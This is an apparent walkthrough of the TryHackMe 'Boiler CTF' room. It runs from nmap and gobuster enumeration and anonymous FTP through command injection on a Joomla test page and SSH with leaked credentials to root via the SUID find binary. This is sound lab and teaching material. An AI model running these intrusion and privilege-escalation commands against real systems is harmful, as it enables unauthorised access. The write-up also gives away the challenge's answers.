# [Boiler CTF](https://tryhackme.com/room/boilerctf2)

## Intermediate level CTF

# Questions #1

## Intermediate level CTF. Just enumerate, you'll get there.

### File extension after anon login

1. Enumerate ports with nmap

```Bash
nmap -p- -sV <IP>
```

![SCREEN01](https://github.com/user-attachments/assets/a531c3d5-b1ab-4e54-a4a1-e54c1f6d5384)

2. There is an ftp port on which we can log in anonymously

```Bash
ftp <IP>
anonymous
cd /
ls -la
get .info.txt
```

![SCREEN03](https://github.com/user-attachments/assets/069303b0-1e7b-4814-8f35-72711a0c11a5)

3. The file is encoded with ROT13, and contains very important information ;)

### What is on the highest port?

### What's running on port 10000?

1. After enumerating the ports we know that on highest port there is `ssh`, and there is webmin running on the port 10000

![SCREEN01](https://github.com/user-attachments/assets/3bdee817-07f0-42ac-a128-378591af040f)

### What CMS can you access?

1. After running gobuster, we find out about `/joomla` endpoint

```Bash
gobuster dir -u http://<IP>:80 -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,txt,html,php
```

![SCREEN02](https://github.com/user-attachments/assets/abe8f50a-7755-4956-a699-38d4b91da806)

### The interesting file name in the folder?

1. Let's go deeper into Joomla

```Bash
gobuster dir -u http://<IP>:80/joomla/ -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,txt,html,php
```

![SCREEN04](https://github.com/user-attachments/assets/97b0f159-48c3-4004-abdd-313185b27ebc)

2. The `/administrator` and `/_files` are the most interesting ones. I decided to search for more directories with `_` prefix. This way I stumbled upon `/_test` directory

```Bash
sed 's/^/_/' /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt > underscore-wordlist.txt
```

```Bash
gobuster dir -u http://<IP>/joomla/ -w underscore-wordlist.txt
```

![SCREEN05](https://github.com/user-attachments/assets/ddba2503-fda7-4251-8bfc-7d04b2c8f0d4)

3. If we try command injection we can get a list of files

![SCREEN06](https://github.com/user-attachments/assets/4550f240-e0d0-4d00-bf98-47e354283681)

# Questions #2

## You can complete this with manual enumeration, but do it as you wish

### Where was the other users pass stored?

1. In `log.txt`, we can find credentials to log in using ssh

![SCREEN07](https://github.com/user-attachments/assets/40b8aff0-08b6-46dd-85eb-9c0a3ace712d)

```Bash
ssh basterd@<IP> -p 55007
python -c 'import pty; pty.spawn("/bin/bash")'
ls
cat backup.sh
```

![SCREEN08](https://github.com/user-attachments/assets/4ea9de35-e05a-4676-a635-361c9f913eb9)

### user.txt

1. Switch to our newly acquired user

```Bash
su stoner
ls -la
cat .secret
```

![SCREEN09](https://github.com/user-attachments/assets/0f8ef817-29a3-43c0-ac21-7090128a7c01)

### What did you exploit to get the privileged user?

1. `sudo -l` doesn't give us anything useful so let's search for SUID binaries

```Bash
find / -perm -u=s -type f 2>/dev/null
```

![SCREEN10](https://github.com/user-attachments/assets/4dd92c31-3d12-4d10-a859-17dedd02fd31)

2. Go to the [GTFOBins](https://gtfobins.github.io/gtfobins/find/) and search for the `find` command

```Bash
/usr/bin/find . -exec /bin/sh -p \; -quit
cat /root/root.txt
```

![SCREEN11](https://github.com/user-attachments/assets/5ae5cdda-fcdd-4e43-9724-076981effe78)
